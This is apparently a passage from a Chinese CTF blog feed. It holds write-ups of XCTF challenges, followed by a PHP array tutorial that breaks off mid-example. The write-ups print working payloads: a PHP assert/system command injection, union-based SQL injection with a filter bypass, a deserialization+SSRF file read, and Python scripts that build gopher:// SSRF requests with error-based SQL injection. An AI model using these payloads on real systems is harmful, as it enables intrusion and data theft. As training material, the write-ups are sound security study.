attempt!&quot;</span>);<br><br><span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> Make this look nice</span><br><span class="hljs-title function_ invoke__">assert</span>(<span class="hljs-string">&quot;file_exists(&#x27;<span class="hljs-subst">$file</span>&#x27;)&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;That file doesn&#x27;t exist!&quot;</span>);<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>我们来看这一段代码<br>猜测flag是不是在templates&#x2F;flag.php下<br>1、我们可以使用assert运行代码<br>2、我们可以通过闭合strpos使得报错<br>3、使用system函数执行外面命令</p><p>但是我们应该如何构造payload的呢，尝试构造payload:<br>?page&#x3D;”)or system(“cat .&#x2F;templates&#x2F;flag.php”);&#x2F;&#x2F;</p><h2 id="Fakebook"><a href="#Fakebook" class="headerlink" title="Fakebook"></a>Fakebook</h2><h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><h4 id="寻找注入点"><a href="#寻找注入点" class="headerlink" title="寻找注入点"></a>寻找注入点</h4><p>几个按钮点一点发现url上存在?no&#x3D;1这种，我们应该想到SQL注入<br>开始尝试<br>?no&#x3D;1’and 1&#x3D;1#<br>这里发现单引号会一直出错，我们尝试数字型注入<br>?no&#x3D;1 and 1&#x3D;1#<br>?no&#x3D;1 and 1&#x3D;2#<br>一个报错一个不报错，确认存在SQL注入</p><h4 id="判断字段数"><a href="#判断字段数" class="headerlink" title="判断字段数"></a>判断字段数</h4><p>order by 4正常回显<br>order by 5页面错误<br>字段数为4</p><h4 id="开始注入"><a href="#开始注入" class="headerlink" title="开始注入"></a>开始注入</h4><p>联合查询<br><img src="/img/%E7%BB%BC%E5%90%885.png" srcset="/img/loading.gif" lazyload><br>这里我们进行尝试绕过 大小写 双写<br>因为这里显示报错信息，所以应该是通过检测字符进行防御，双写大概率不行<br>最后用++或者&#x2F;&#x2F;符号将union 和select 隔开发现可以绕过<br><img src="/img/%E7%BB%BC%E5%90%886.png" srcset="/img/loading.gif" lazyload><br>发现2是有效回显点，**(这里注意一个路径&#x2F;var&#x2F;www&#x2F;html&#x2F;view.php)**</p><p>通过注入得到<br>库名 fakebook 其他的库 information_schema,mysql,performance_schema,test<br>用户 root@localhost<br>开始查表得到表 users<br>查字段<br><img src="/img/%E7%BB%BC%E5%90%887.png" srcset="/img/loading.gif" lazyload><br>查字段内容 username passwd data<br><img src="/img/%E7%BB%BC%E5%90%888.png" srcset="/img/loading.gif" lazyload><br>MD5解密后发现这个是其实就是注册的密码 后面的反序列化内容也是注册的信息</p><h3 id="代码审计-2"><a href="#代码审计-2" class="headerlink" title="代码审计"></a>代码审计</h3><p>参考其他web可以发现robots.txt下面有东西<br>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserInfo</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span> = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$blog</span> = <span class="hljs-string">&quot;&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$age</span>, <span class="hljs-variable">$blog</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;age = (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$age</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;blog = <span class="hljs-variable">$blog</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>();<br><br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);<br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br>        <span class="hljs-variable">$output</span> = <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br>        <span class="hljs-variable">$httpCode</span> = <span class="hljs-title function_ invoke__">curl_getinfo</span>(<span class="hljs-variable">$ch</span>, CURLINFO_HTTP_CODE);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$httpCode</span> == <span class="hljs-number">404</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">404</span>;<br>        &#125;<br>        <span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$output</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getBlogContents</span> (<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$this</span>-&gt;blog);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isValidBlog</span> (<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$blog</span> = <span class="hljs-variable language_">$this</span>-&gt;blog;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="hljs-variable">$blog</span>);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>代码审计发现curl函数这里应该想到请求伪造，我们搜索data里面的返回是序列化，所以我们猜测内容需要进行一次反序列化输出，所以构造反序列化内容，由于存在curl函数，所以应该想到请求伪造，SSRF又可以使用file等协议，所以我们直接构造payload</p><h3 id="反序列化-SSRF"><a href="#反序列化-SSRF" class="headerlink" title="反序列化+SSRF"></a>反序列化+SSRF</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserInfo</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&quot;1&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span> = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$blog</span> = <span class="hljs-string">&quot;file:///var/www/html/flag.php&quot;</span>;<br><br><br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">UserInfo</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure><p>将序列化后的结果放到板块四中，查看源码即可发现flag</p><h2 id="very-easy-sql"><a href="#very-easy-sql" class="headerlink" title="very_easy_sql"></a><strong>very_easy_sql</strong></h2><p>这个题目到处瞧一瞧看一看就会发现是个SSRF</p><h3 id="Gopher协议"><a href="#Gopher协议" class="headerlink" title="Gopher协议"></a>Gopher协议</h3><p>gopher支持发出GET、POST请求。可以先截获get请求包和post请求包，再构造成符合gopher协议的请求,gopher协议是<a href="https://so.csdn.net/so/search?q=ssrf&spm=1001.2101.3001.7020">ssrf</a>利用中一个最强大的协议(俗称万能协议)</p><h4 id="gopher协议数据格式："><a href="#gopher协议数据格式：" class="headerlink" title="gopher协议数据格式："></a>gopher协议数据格式：</h4><p>gopher:&#x2F;&#x2F;ip:port&#x2F;_TCP&#x2F;IP数据流<br><strong>注意</strong></p><ul><li>gopher协议数据流中，url编码使用%0d%0a替换字符串中的回车换行</li><li>数据流末尾使用%0d%0a代表消息结束</li></ul><h4 id="POST请求"><a href="#POST请求" class="headerlink" title="POST请求"></a>POST请求</h4><p>构造gopher的post请求需要知道有四个参数是必须的，</p><ol><li>目标URL：即请求的目标地址。</li><li>请求头：包含请求的元数据，如Content-Type、Content-Length等。</li><li>请求体：包含请求的具体数据内容，可以是表单数据、JSON数据、XML数据等。</li></ol><p>其中，目标URL和请求头是必须的，而请求体则根据实际情况而定。如果请求不需要传递数据，则请求体可以为空。</p><h4 id="python编写Gopher协议的payload"><a href="#python编写Gopher协议的payload" class="headerlink" title="python编写Gopher协议的payload"></a>python编写Gopher协议的payload</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib.parse<br><br>host = <span class="hljs-string">&quot;127.0.0.1:80&quot;</span><br>content = <span class="hljs-string">&quot;uname=admin&amp;passwd=admin&quot;</span><br>content_length = <span class="hljs-built_in">len</span>(content)<br><br>test =\<br><span class="hljs-string">&quot;&quot;&quot;POST /index.php HTTP/1.1</span><br><span class="hljs-string">Host: &#123;&#125;</span><br><span class="hljs-string">Content-Type: application/x-www-form-urlencoded</span><br><span class="hljs-string">Content-Length: &#123;&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span>.<span class="hljs-built_in">format</span>(host,content_length,content)<br>//按照标准，URL只允许一部分ASCII字符，其他字符（如汉字）是不符合标准的，此时就要进行编码。<br>因为我在构造URL的过程中要使用到中文：此时需要用到urllib.parse.quote，此处是为了替换特殊字符\<br>tmp = urllib.parse.quote(test) <br>new = tmp.replace(<span class="hljs-string">&quot;%0A&quot;</span>,<span class="hljs-string">&quot;%0D%0A&quot;</span>)<br>result = urllib.parse.quote(new) <br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;gopher://&quot;</span>+host+<span class="hljs-string">&quot;/_&quot;</span>+result)<br><br></code></pre></td></tr></table></figure><p>突然很容器出现问题</p><p>只能按着别人题解写了</p><p>我们在返回包里面可以看到一个cookie，base64()解密后发现是admin<br>我们构造payload admin’#发现会报错接下来就是使用报错注入了，进行爆库，表字段<br>下面是payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib.parse<br><span class="hljs-keyword">import</span> base64<br>host = <span class="hljs-string">&quot;127.0.0.1:80&quot;</span><br>payload = <span class="hljs-string">&quot;admin&#x27;) and extractvalue(1, concat(0x7e, (select database()),0x7e)) #&quot;</span><br>base64_payload = <span class="hljs-built_in">str</span>(base64.b64encode(payload.encode(<span class="hljs-string">&quot;utf-8&quot;</span>)), <span class="hljs-string">&quot;utf-8&quot;</span>)<br>cookie=<span class="hljs-string">&quot;this_is_your_cookie=&quot;</span>+base64_payload<br><br>test =\<br><span class="hljs-string">&quot;&quot;&quot;GET /index.php HTTP/1.1</span><br><span class="hljs-string">Host: &#123;&#125;</span><br><span class="hljs-string">Connection: close</span><br><span class="hljs-string">Content-Type: application/x-www-form-urlencoded</span><br><span class="hljs-string">Cookie:&#123;&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span>.<span class="hljs-built_in">format</span>(host,cookie)<br><br>tmp = urllib.parse.quote(test)<br>new = tmp.replace(<span class="hljs-string">&quot;%0A&quot;</span>,<span class="hljs-string">&quot;%0D%0A&quot;</span>)<br>result = urllib.parse.quote(new)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;gopher://&quot;</span>+host+<span class="hljs-string">&quot;/_&quot;</span>+result)<br><br></code></pre></td></tr></table></figure><p>base64_payload &#x3D; str(base64.b64encode(payload.encode(“utf-8”)), “utf-8”)这里解释下这个payload<br>1、在python中，base64.b64encode()函数将字节字符串编码为 Base64 字符串，返回的是一个 bytes 类型的对象。<br>2、而 str() 函数用于将对象转换为字符串。因此，我们需要使用 str() 函数将 bytes 类型的对象转换为字符串类型的对象，以便后续的使用。<br>这里举个例字</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><br><span class="hljs-comment"># 将字符串编码为 Base64 字符串</span><br>payload = <span class="hljs-string">&quot;Hello, world!&quot;</span><br>base64_payload = base64.b64encode(payload.encode(<span class="hljs-string">&quot;utf-8&quot;</span>)).decode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br><br><span class="hljs-built_in">print</span>(base64_payload)  <span class="hljs-comment"># SGVsbG8sIHdvcmxkIQ==</span><br></code></pre></td></tr></table></figure><p>在这个例子中，我们使用 <code>decode()</code> 方法将 Base64 编码后的 bytes 对象解码为字符串类型的对象，以便后续的使用</p><h4 id="字节字符串"><a href="#字节字符串" class="headerlink" title="字节字符串"></a>字节字符串</h4><p>在 Python 中，字节字符串（bytes）是一种特殊的数据类型，表示一个由字节序列组成的不可变序列。字节字符串与普通字符串（str）不同的是，它们是以二进制形式存储的，而不是以 Unicode 编码形式存储的。这意味着字节字符串可以包含任意的二进制数据，包括文本、图像、音频等等。而普通字符串则只能包含 Unicode 字符。</p><p>字节字符串可以通过在字符串前加上 <code>b</code> 或 <code>B</code> 来创建，例如</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 创建一个字节字符串</span><br>bstr = <span class="hljs-string">b&#x27;hello world&#x27;</span><br><br></code></pre></td></tr></table></figure><p>在这个例子中，我们使用 b 前缀创建了一个字节字符串，其中包含了 ASCII 编码的字符序列。字节字符串可以使用和普通字符串类似的操作，例如索引、切片、拼接等等。但需要注意的是，字节字符串中的元素是字节（byte），而不是字符（character）。因此，在对字节字符串进行操作时需要使用字节操作符和字节函数。</p><p>再举一个例子</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">s = <span class="hljs-string">&quot;你好vince&quot;</span><br>b = s.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br><span class="hljs-comment">#将字符串“你好vince”转换为字节字符串后，结果是一个字节数组（bytes）对象，其内容为字节序列。具体来说，使用 UTF-8 编码时，每个中文字符占用 3 个字节，每个英文字母占用 1 个字节。</span><br><span class="hljs-string">b&#x27;\xe4\xbd\xa0\xe5\xa5\xbd\x76\x69\x6e\x63\x65&#x27;</span><br></code></pre></td></tr></table></figure><p>\xe4\xbd\xa0\xe5\xa5\xbdvince和b’\xe4\xbd\xa0\xe5\xa5\xbdv\x69\x6e\x63\x65’表示的是一个字节序列</p><p><strong>在 Python 中，如果你想要表示英语字母的字节，可以直接使用字母来表示。因为英文字母在 ASCII 编码中的值是 0 到 127，所以在使用 ASCII 编码时，英文字母的字节表示和它们的字符值是相同的。例如，字母 ‘a’ 的 ASCII 编码值是 97，它的字节表示就是 b’a’。但是，在使用其他编码方式时，英文字母的字节表示可能会不同。例如，在 UTF-8 编码中，英文字母的字节表示通常是一个字节。</strong></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
      <category>综合攻防世界</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>文件包含</tag>
      
      <tag>代码执行</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>php数组</title>
    <link href="/2023/05/28/php%E6%95%B0%E7%BB%84/"/>
    <url>/2023/05/28/php%E6%95%B0%E7%BB%84/</url>
    
    <content type="html"><![CDATA[<h3 id="Array数组"><a href="#Array数组" class="headerlink" title="Array数组"></a>Array数组</h3><p>可以用 <a href="https://www.php.net/manual/zh/function.array.php">array()</a> 语言结构来新建一个 array。它接受任意数量用逗号分隔的 <code>键（key） =&gt; 值（value）</code> 对。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">array</span>(<br>    key  =&gt; value,<br>    key2 =&gt; value2,<br>    key3 =&gt; value3,<br>    ...<br>)<br></code></pre></td></tr></table></figure><p>最后一个数组单元之后的逗号可以省略。通常用于单行数组定义中，例如常用 <code>array(1, 2)</code> 而不是 <code>array(1, 2, )</code>。对多行数组定义通常保留最后一个逗号，这样要添加一个新单元时更方便。<strong>注意</strong>:</p><p><strong>可以用短数组语法 <code>[]</code> 替代 <code>array()</code></strong> </p><h4 id="示例-1-一个简单数组"><a href="#示例-1-一个简单数组" class="headerlink" title="示例 1 一个简单数组"></a><strong>示例 1 一个简单数组</strong></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$array</span> = <span class="hljs-keyword">array</span>(<br>    <span class="hljs-string">&quot;foo&quot;</span> =&gt; <span class="hljs-string">&quot;bar&quot;</span>,<br>    <span class="hljs-string">&quot;bar&quot;</span> =&gt; <span class="hljs-string">&quot;foo&quot;</span>,<br>);<br><br><span class="hljs-comment">// 使用短数组语法</span><br><span class="hljs-variable">$array</span> = [<br>    <span class="hljs-string">&quot;foo&quot;</span> =&gt; <span class="hljs-string">&quot;bar&quot;</span>,<br>    <span class="hljs-string">&quot;bar&quot;</span> =&gt; <span class="hljs-string">&quot;foo&quot;</span>,<br>];<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>key 可以是 integer 或者 string。value 可以是任意类型</p><p>此外 key 会有如下的强制转换</p><ul><li>String 中包含有效的十进制 int，除非数字前面有一个 + 号，否则将被转换为 int 类型。例如键名 “8” 实际会被储存为 8。另外， “08” 不会被强制转换，因为它不是一个有效的十进制整数。</li><li>Float 也会被转换为 int ，意味着其小数部分会被舍去。例如键名 8.7 实际会被储存为 8。</li><li>Bool 也会被转换成 int。即键名 true 实际会被储存为 1 而键名 false 会被储存为 0。</li><li>Null 会被转换为空字符串，即键名 null 实际会被储存为 “”。</li><li>Array 和 object 不能 被用为键名。坚持这么做会导致警告：Illegal offset type。</li></ul><p><strong>如果在数组定义时多个元素都使用相同键名，那么只有最后一个会被使用，其它的元素都会被覆盖</strong></p><h4 id="示例-2-类型转换与覆盖的示例"><a href="#示例-2-类型转换与覆盖的示例" class="headerlink" title="示例 2 类型转换与覆盖的示例"></a><strong>示例 2 类型转换与覆盖的示例</strong></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$array</span> = <span class="hljs-keyword">array</span>(<br>    <span class="hljs-number">1</span>    =&gt; <span class="hljs-string">&quot;a&quot;</span>,<br>    <span class="hljs-string">&quot;1&quot;</span>  =&gt; <span class="hljs-string">&quot;b&quot;</span>,<br>    <span class="hljs-number">1.5</span>  =&gt; <span class="hljs-string">&quot;c&quot;</span>,<br>    <span class="hljs-literal">true</span> =&gt; <span class="hljs-string">&quot;d&quot;</span>,<br>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$array</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>以上示例会输出：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">array</span>(<span class="hljs-number">1</span>) &#123;<br>  [<span class="hljs-number">1</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;d&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>上例中所有的键名都被强制转换为 <code>1</code>，则每一个新单元都会覆盖前一个的值，最后剩下的只有一个 <code>&quot;d&quot;</code></p><p>PHP 数组可以同时含有 int 和 string 类型的键名，因为 PHP 实际并不区分索引数组和关联数组。</p><h4 id="示例-3-混合-int-和-string-键名"><a href="#示例-3-混合-int-和-string-键名" class="headerlink" title="示例 3 混合 int 和 string 键名"></a><strong>示例 3 混合 int 和 string 键名</strong></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$array</span> = <span class="hljs-keyword">array</span>(<br>    <span class="hljs-string">&quot;foo&quot;</span> =&gt; <span class="hljs-string">&quot;bar&quot;</span>,<br>    <span class="hljs-string">&quot;bar&quot;</span> =&gt; <span class="hljs-string">&quot;foo&quot;</span>,<br>    <span class="hljs-number">100</span>   =&gt; -<span class="hljs-number">100</span>,<br>    -<span class="hljs-number">100</span>  =&gt; <span class="hljs-number">100</span>,<br>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$array</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>以上示例会输出：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">array</span>(<span class="hljs-number">4</span>) &#123;<br>  [<span class="hljs-string">&quot;foo&quot;</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">3</span>) <span class="hljs-string">&quot;bar&quot;</span><br>  [<span class="hljs-string">&quot;bar&quot;</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">3</span>) <span class="hljs-string">&quot;foo&quot;</span><br>  [<span class="hljs-number">100</span>]=&gt;<br>  <span class="hljs-keyword">int</span>(-<span class="hljs-number">100</span>)<br>  [-<span class="hljs-number">100</span>]=&gt;<br>  <span class="hljs-keyword">int</span>(<span class="hljs-number">100</span>)<br>&#125;<br></code></pre></td></tr></table></figure><p>key 为可选项。如果未指定，PHP 将自动使用之前用过的最大 int 键名加上 1 作为新的键名</p><h4 id="示例-4-没有键名的索引数组"><a href="#示例-4-没有键名的索引数组" class="headerlink" title="示例 4 没有键名的索引数组"></a><strong>示例 4 没有键名的索引数组</strong></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$array</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;foo&quot;</span>, <span class="hljs-string">&quot;bar&quot;</span>, <span class="hljs-string">&quot;hello&quot;</span>, <span class="hljs-string">&quot;world&quot;</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$array</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>以上示例会输出：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">array</span>(<span class="hljs-number">4</span>) &#123;<br>  [<span class="hljs-number">0</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">3</span>) <span class="hljs-string">&quot;foo&quot;</span><br>  [<span class="hljs-number">1</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">3</span>) <span class="hljs-string">&quot;bar&quot;</span><br>  [<span class="hljs-number">2</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">5</span>) <span class="hljs-string">&quot;hello&quot;</span><br>  [<span class="hljs-number">3</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">5</span>) <span class="hljs-string">&quot;world&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><h4 id="示例-5-仅对部分单元指定键名"><a href="#示例-5-仅对部分单元指定键名" class="headerlink" title="示例 5 仅对部分单元指定键名"></a><strong>示例 5 仅对部分单元指定键名</strong></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$array</span> = <span class="hljs-keyword">array</span>(<br>         <span class="hljs-string">&quot;a&quot;</span>,<br>         <span class="hljs-string">&quot;b&quot;</span>,<br>    <span class="hljs-number">6</span> =&gt; <span class="hljs-string">&quot;c&quot;</span>,<br>         <span class="hljs-string">&quot;d&quot;</span>,<br>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$array</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>以上示例会输出：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">array</span>(<span class="hljs-number">4</span>) &#123;<br>  [<span class="hljs-number">0</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;a&quot;</span><br>  [<span class="hljs-number">1</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;b&quot;</span><br>  [<span class="hljs-number">6</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;c&quot;</span><br>  [<span class="hljs-number">7</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">1</span>) 